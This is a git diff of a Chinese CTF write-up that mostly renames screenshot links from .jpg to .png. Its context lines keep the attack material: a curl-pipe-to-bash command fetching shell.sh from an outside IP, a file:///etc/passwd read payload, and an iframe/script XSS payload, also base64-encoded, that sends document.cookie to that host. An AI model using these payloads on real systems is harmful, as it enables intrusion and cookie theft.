@@ -65,7 +65,7 @@ sudo /backup.sh
 _[2025.happy.new.year=system("curl http://156.238.233.9/shell.sh|bash");
 ```
 
-![image](./assets/001.jpg)
+![image](./assets/001.png)
 
 发现没有权限，并且看到一个backup.sh
 
@@ -97,7 +97,7 @@ ls -al
 cat /var/www/html/backup/Rflag
 ```
 
-![image](./assets/002.jpg)
+![image](./assets/002.png)
 
 把环境给清理了
 
@@ -180,9 +180,9 @@ avatar=acvtar.jpg&url=file:///etc/passwd
 
 只要上传了一个文件，并且文件是存在的就可以进行文件读取，其中得到这三个包
 
-![image](./assets/004.jpg)
+![image](./assets/004.png)
 
-![image](./assets/005.jpg)
+![image](./assets/005.png)
 
 但是读不了flag，典型的任意文件读取到RCE，其中比较难得，就是要把cookie带上，
 
@@ -259,7 +259,7 @@ deactivate
 
 302和200还是有区别的，虽然结果一样
 
-![image](./assets/007.jpg)
+![image](./assets/007.png)
 
 ## EasyDB
 
@@ -269,15 +269,15 @@ deactivate
 
 调用函数检查用户名
 
-![image](./assets/009.jpg)
+![image](./assets/009.png)
 
 直接拼接语句，ohshit,那注入整起
 
-![image](./assets/010.jpg)
+![image](./assets/010.png)
 
 黑名单是这些，
 
-![image](./assets/011.jpg)
+![image](./assets/011.png)
 
 使用的是`h2`的数据库`jdbc:h2:mem:testdb`使用的是内存模式，可以进行堆叠注入，利用反射和拼接绕过，拿到`Runtime.exec`，`h2`的数据库可以利用`CREATE...CALL`来调用函数
 
@@ -365,7 +365,7 @@ app.use((req, res) => {
 
 纯文本返回可以进行任意内容构造，有点脏字符，注释掉就好了
 
-![image](./assets/014.jpg)
+![image](./assets/014.png)
 
 所以写出payload，`iframe`结束标签可以省略
 
@@ -373,7 +373,7 @@ app.use((req, res) => {
 <iframe/srcdoc="<script/src='**/fetch(`http://156.238.233.9:9999/`+document.cookie)//'></script>">
 ```
 
-![image](./assets/015.jpg)
+![image](./assets/015.png)
 
 ```http
 POST /report HTTP/1.1
@@ -390,7 +390,7 @@ Content-Length: 43
 {"text":"Jmx0O2lmcmFtZSZzb2w7c3JjZG9jJmVxdWFsczsmcXVvdDsmbHQ7c2NyaXB0JnNvbDtzcmMmZXF1YWxzOyZhcG9zOyZhc3Q7JmFzdDsmc29sO2ZldGNoJmxwYXI7JmdyYXZlO2h0dHAmY29sb247JnNvbDsmc29sOzE1NiZwZXJpb2Q7MjM4JnBlcmlvZDsyMzMmcGVyaW9kOzkmY29sb247OTk5OSZzb2w7JmdyYXZlOyZwbHVzO2RvY3VtZW50JnBlcmlvZDtjb29raWUmcnBhcjsmc29sOyZzb2w7JmFwb3M7Jmd0OyZsdDsmc29sO3NjcmlwdCZndDsmcXVvdDsmZ3Q7"}
 ```
 
-![image](./assets/016.jpg)
+![image](./assets/016.png)
 
 ## traefik
 
@@ -415,7 +415,7 @@ public/upload/6c20d681-a875-4dd6-abc0-331ca1c5f571
 
 要想覆盖就要
 
-![image](./assets/019.jpg)
+![image](./assets/019.png)
 
 ```
 ./../../.config/dynamic.yml
@@ -509,7 +509,7 @@ docker exec -it 36b02c422cf1 sh
 
 现在再来用脚本打一遍就拿到flag了
 
-![image](./assets/021.jpg)
+![image](./assets/021.png)
 
 # 小结
 
